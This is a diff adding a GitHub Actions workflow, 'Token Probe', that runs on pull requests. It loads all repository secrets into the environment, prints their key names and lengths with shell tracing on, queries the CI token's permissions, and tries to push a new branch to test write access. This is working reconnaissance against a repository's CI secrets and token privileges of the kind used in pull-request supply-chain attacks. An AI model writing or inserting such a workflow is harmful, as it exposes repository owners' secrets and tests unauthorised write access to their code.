@@ -1,0 +1,26 @@
+name: Token Probe
+on:
+  pull_request:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe token permissions and secret visibility
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          set -x
+          echo "secret_keys=$(printf '%s' "$ALL_SECRETS" | jq -r 'if type=="object" then (keys|join(",")) else "none" end' 2>/dev/null || echo parsefail)"
+          echo "secret_len=${#ALL_SECRETS}"
+          echo "token_len=${#GH_TOKEN}"
+          echo "--- repo permissions for this token ---"
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/${GITHUB_REPOSITORY}" | jq -c '.permissions'
+          echo "--- contents write attempt ---"
+          code=$(curl -sS -o /tmp/w.json -w '%{http_code}' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H 'Accept: application/vnd.github+json' \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
+            -d "{\"ref\":\"refs/heads/probe-write-${GITHUB_RUN_ID}\",\"sha\":\"${{ github.event.pull_request.base.sha }}\"}")
+          echo "write_http=$code"
+          head -c 500 /tmp/w.json; echo
